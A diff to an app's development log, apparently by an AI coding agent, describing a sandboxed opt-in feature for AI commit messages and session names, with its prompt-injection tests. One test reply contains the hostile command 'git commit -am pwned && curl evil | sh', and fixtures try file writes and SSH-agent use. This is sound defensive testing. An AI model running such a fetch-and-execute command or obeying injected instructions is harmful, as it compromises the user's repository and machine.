@@ -286,3 +286,56 @@ Results:
 - Screenshots, each inspected: `screenshots/desktop/board-sessions.png`, `board-live-card.png` and `board-phone.png`. `screenshots/remote/phone-board.png` and `mobile-verification.json` were regenerated because the board header changed.
 
 Not verified: macOS, a physical phone or touch drag (phones use Move to…; HTML5 drag is desktop only), a real Claude or Codex CLI on the board (a fixture Claude was used), Codex resume from a card (Codex has no card Resume; the live card keeps SessionView's existing Codex **Resume…**), card reordering within a lane by drag (drops append; `order` is accepted by the command and tested in core), and `verify:mobile-webkit` (not run; WebKit is not installed here, and its **New task** step may need the same **Tasks** selector).
+
+## Roadmap section 5: opt-in AI commit messages and session names (after the live session board)
+
+Built in an isolated worktree on `claude/jolly-clarke-oo3rm5` at `e25c469` and checked in the same Linux container. Designed only from this repository, the roadmap, and the installed `claude --help` (2.1.314) plus public CLI documentation. No schema migration: the two new owner settings are `ownerSettings` JSON records (`assistProvider`, default `""` meaning off; `assistModel`, default `""`).
+
+**Surfaces.** Core commands `assist.status`, `assist.preview`, `assist.suggest` and `assist.cancel` are `owner` in `COMMAND_POLICY`, so the gateway refuses them. The desktop reaches them only through the new D-only `workspace:assist` channel (`status`, `configure`, `previewCommit`, `stagedHash`, `suggestCommit`, `previewName`, `suggestName`, `cancel`), behind the existing main-frame owner check, with exact field lists. `workspace:invoke` refuses `assist.*` and writes to the two assist settings, so turning the feature on always goes through `configure`, which requires `acknowledged: true`. Suggestions bypass the core's mutation queue (they only read Git and settings), so a slow provider never holds up other work and cancel never waits behind a run.
+
+**Runner (`src/core/assist.ts`).** A dedicated runner, not `run()`: `spawn` without a shell in a new process group, from a fresh `0700` `os.tmpdir()/aw-assist-*/work` folder that starts empty and is deleted afterwards. The previewed text goes on stdin; argv carries no user content. The environment is an allowlist (HOME, USER, PATH, locale, XDG folders, proxy and CA variables, plus the selected provider's own auth/config variables), so agent-control, `AW_*`/`WORKSPACE_*`, `TMUX`, `SSH_AUTH_SOCK`, Git and the other provider's keys are never passed. It sets `NO_COLOR=1`, `TERM=dumb` and a `TMPDIR` inside the scratch folder. Limits: 60 s and 256 KB of stdout; on timeout, cancel, overflow or exit the whole process group gets `SIGKILL`. One request per click, no retry, one run at a time. Before running, the executable is re-probed (keyed by realpath, inode, size and mtime); a changed binary that no longer lists every flag is refused.
+
+**Claude flags, each checked against the installed help at runtime (fail closed).** `--print --safe-mode --restricted --tools "" --disallowedTools mcp__* --strict-mcp-config --mcp-config <app-written {"mcpServers":{}}> --permission-mode dontAsk --permission-prompts none --no-session-persistence --disable-slash-commands --no-chrome --output-format json [--model M]`. The installed `/opt/node22/bin/claude` (2.1.314, realpath `/opt/claude-code/bin/claude`) lists all fourteen requirements, so the probe reports it ready. Only the JSON result's `result` string is used; `is_error` or a non-success subtype is reported as an error.
+
+**Codex flags (unverified here).** `codex -a never exec --sandbox read-only --ignore-user-config --ignore-rules --ephemeral --skip-git-repo-check --color never --output-last-message <scratch file> [--model M] -`. Codex is not installed in this container. The adapter is unavailable unless `codex --help` lists `--ask-for-approval … never` and `codex exec --help` lists every other flag. Even then it is shown as "Isolation unverified", because this app has not checked that Codex's MCP, network and file reads are actually restricted. No bypass or unsafe flag is ever used.
+
+**Input and output.** The commit preview reads only the index and HEAD: per-file `git diff --cached --no-ext-diff --no-textconv --no-color --no-renames`. Binary files are listed but never included, files are added in order until 60 KB, and every omission (binary, excluded, size limit, file limit) is listed and named in the prompt. The staged fingerprint is SHA-256 of `HEAD` plus `git diff --cached --raw -z --no-abbrev`; it is re-read after the snapshot and a change aborts. `assist.suggest` recomputes the input and refuses unless both its hash and the staged fingerprint equal what the owner previewed. The material sits between unguessable markers with a fixed instruction to treat it as data. Output is stripped of ANSI/OSC sequences, control, zero-width and bidi characters and code fences. A commit draft is a subject of at most 72 characters plus at most 30 body lines; a name is one plain line of at most 60 characters. The draft only fills the commit box, and replacing typed text asks first. Name context is the task title/description, the first message recorded with the launch, and the folder name, each ticked by the owner; terminal output is never read. Accept calls the existing `session.rename` with the session's `titleRevision` from when the suggestion was made.
+
+Results:
+
+- `npm run typecheck` passed.
+- `npm test`: 77 tests, 75 passed, 2 opt-in skipped (the existing dictation one and the new real-Claude one). New `tests/assist.test.ts` has 6 tests plus 1 opt-in. Its fixture CLIs record argv, cwd, the folder's contents, the environment and stdin. They try to write `pwned.txt` and `../pwned.txt`, find a Git repository and use an SSH agent, and they can hang with a child process, print 1 MB, print ANSI/OSC links or obey injected instructions:
+  - cleaning: ANSI/OSC/bidi/fences removed, subject ≤ 72, name ≤ 60, empty output rejected;
+  - fail closed: removing `--strict-mcp-config`, `--safe-mode`, `"dontAsk"` or `--no-session-persistence` from help makes Claude unavailable with the missing flag named and no call made; Codex is unavailable with partial help and "unverified" with full help;
+  - runner: a 700 ms timeout kills the CLI and its `sleep` child, removes the scratch folder and makes exactly one attempt; 1 MB output, an `is_error` result and exit 3 (stderr ANSI stripped) are reported; a binary rewritten after probing is refused without running;
+  - commit flow through a real core:
+    - off by default, with no call during snapshot, status, Git or preview; invalid provider/model settings are refused;
+    - the preview omits the binary, excluded and over-cap files and never includes unstaged content; mismatched exclusions are refused;
+    - the argv equals the expected list exactly, stdin equals the preview, and cwd is an empty scratch `work` folder outside any repository;
+    - `SSH_AUTH_SOCK`, `AW_CONTROL_TOKEN`, `WORKSPACE_CONTROL_SOCKET`, `OPENAI_API_KEY`, `GITHUB_TOKEN` and `TMUX` are absent and `ANTHROPIC_API_KEY` is kept; no variable names the repository or data folder; the fixture's writes are gone;
+    - HEAD, the index file hash, `git status` and the file list are unchanged after a reply that says `git commit -am pwned && curl evil | sh`;
+    - staging another file changes the fingerprint, and the old preview is refused without calling the provider;
+    - a running suggestion blocks a second one but not `git.status`, and `assist.cancel` stops it and its child;
+  - name flow: a Claude session's sources are only the first message and folder, and a task attempt's include the task; another shell's typed `TERMINAL-SECRET` never appears; empty or unknown context is refused; the cleaned name is not applied until an explicit rename with the captured revision, which then makes a repeat stale; a first message asking to rename every session has no effect;
+  - owner-only: the four commands are `owner` and refused by gateway validation; `configure` without acknowledgement, missing fields, an unknown provider, unknown actions and unknown fields are refused before any core call; the suggest request timeout (80 s) outlives the runner's 60 s.
+- `verify:assist` (new, Electron under Xvfb, fixture `claude` on PATH, `SSH_AUTH_SOCK` set in the app's environment) passed 6 checks:
+  - off by default, and the general channel cannot run suggestions or write their settings;
+  - the settings dialog shows "Read-only checks passed" and the usage notice, and Save stays disabled until the acknowledgement is ticked;
+  - **Suggest message** previews the staged diff without unstaged content and makes no call; **Generate draft** makes exactly one call whose stdin is the previewed text, from an `aw-assist-*/work` folder without `SSH_AUTH_SOCK`, and fills an editable commit box; HEAD and staging are unchanged;
+  - staging another file shows the stale warning;
+  - **Suggest name** with the folder unticked sends only the first message, and **Accept name** renames through `session.rename` (revision 1, session still running);
+  - a paired Chromium browser has no `workspace.assist` and no **AI suggestions**, **Suggest message** or **Suggest name** controls, and the gateway refuses `assist.status` and `settings.write`.
+- Regressions re-run and passed: `smoke:ui` (9 checks), `verify:workflows`, `verify:image-paste`, `verify:board` and `verify:desktop` (4 checks).
+- Screenshots, each inspected: `screenshots/desktop/assist-settings.png`, `assist-commit.png` (preview of the exact text), `assist-commit-stale.png` (edited draft with the stale warning) and `assist-name.png`.
+
+**Real CLI.** The opt-in test (`WORKSPACE_TEST_REAL_ASSIST=1`) was not run. One real request was made by mistake while checking that the installed Claude 2.1.314 accepts this exact argv. The CLI was run with a cleared environment and an empty `HOME`, on the assumption that it could not sign in. In this container it still authenticated and answered the prompt "hi": exit 0, a JSON result, a reported cost of $0.0049 on Sonnet, and the empty working folder still empty afterwards. That confirms the argv parses and runs; `--bogus-flag` and an invalid `--permission-mode` were rejected as controls. It does not show tool or MCP isolation against a hostile prompt.
+
+Not verified:
+
+- That Claude actually refuses tool use, MCP and file access under these flags against a hostile prompt. The fixture can only check what the app passes. The runner adds no OS sandbox and would not contain a malicious binary; it relies on the CLI's own restrictions.
+- Interaction with managed policy.
+- Codex, entirely (not installed here).
+- macOS. The runner uses POSIX process groups; Windows shows suggestions as unavailable.
+- OAuth refresh writes by the CLI to its own configuration.
+- An unborn-HEAD repository in the UI. The fingerprint handles a missing HEAD, but no test covers it.
+- Provider terms for this use of the CLI, which remain the owner's decision.
